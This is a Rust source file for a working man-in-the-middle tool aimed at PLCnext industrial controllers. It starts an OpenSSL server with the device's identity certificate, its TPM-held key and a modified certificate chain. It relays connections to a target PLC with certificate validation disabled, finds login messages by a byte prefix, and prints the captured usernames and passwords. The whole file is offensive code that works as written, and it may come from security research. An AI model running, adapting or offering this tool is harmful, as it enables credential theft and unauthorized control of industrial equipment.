use std::{process::Stdio, io, time::Duration};

use tokio::{net::TcpStream, io::{AsyncReadExt, AsyncWriteExt, BufReader, AsyncBufReadExt}, process::Command, time::timeout};
use tokio_native_tls::TlsConnector;

use clap::Parser;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// ip:port to connect to
    #[arg(short, long)]
    target_address: std::net::SocketAddr,

    /// Port to bind to
    #[arg(short, long, default_value_t = 41199)]
    bind_port: u16,
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let args = Args::parse();
       
    let mut child = Command::new("openssl")
        .arg("s_server")
        .arg("-cert").arg("/media/rfs/ro/etc/plcnext/Security/IdentityStores/IDevID/certificate.pem")
        .arg("-accept").arg(format!("{}", args.bind_port))
        .arg("-keyform").arg("engine")
        .arg("-engine").arg("tpm")
        .arg("-key").arg("/media/rfs/ro/etc/plcnext/Security/IdentityStores/IDevID/tpmkey.pem")
        .arg("-cert_chain").arg("dev_crt_chain_modified.pem")
        .arg("-quiet")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .expect("Failed to launch openSSL server");

    println!("OpenSSL server spawned");
    println!("test.");
    let mut stdin = child.stdin.take().unwrap();
    let mut stdout = BufReader::new(child.stdout.take().unwrap());


    loop {
        println!("Waiting for Connection...");
        stdout.fill_buf().await?;
        println!("Connection detected");

        let connector: TlsConnector = TlsConnector::from(
            native_tls::TlsConnector::builder()
                .danger_accept_invalid_certs(true)
                .danger_accept_invalid_hostnames(true)
                .build()
                .unwrap(),
        );

        println!("Connecting to PLC...");
        let stream_out = TcpStream::connect(args.target_address)
            .await
            .unwrap();
        println!("Connected to PLC");
            
        let mut tls_stream = connector
            .connect("test.com", stream_out)
            .await
            .unwrap();

        println!("TLS stream established");

        //These bytes prefix the the login info
        let search_bytes = [0x04, 0x40, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x00, 0x0d, 0x00, 0xe9, 0xbf, 0x13];
        let mut buf = [0; 4096];

        loop {  
            tokio::select! {
                test = stdout.read(&mut buf) => {
                    match test {
                        Ok(n) => {
                            if let Err(_) = tls_stream.write(&buf[..n]).await {
                                println!("Disconnected");
                                break;
                            }
            
                            if &buf[0..17] == search_bytes {
                                let t = &buf[19..n-3].split(|h| *h == 0).map(|arr| String::from_utf8_lossy(arr)).collect::<Vec<_>>();
                                println!("Username and Password collected:\nUsername: {}\nPassword: {}", t.first().unwrap(), t.last().unwrap());
                            }
                        },
                        Err(_) => {
                            println!("Disconnected");
                            break;
                        },
                    }
                }

                t2 = timeout(Duration::from_millis(10000), tls_stream.read_u8()) => {
                    match t2 {
                        Ok(Ok(b)) => {
                            if let Err(_) = stdin.write(&[b]).await {
                                println!("Disconnected");
                                break;
                            }
                        },
                        _ => {
                            println!("Disconnected");
                            break;
                        },
                    }
                }
            }
        }
    }
}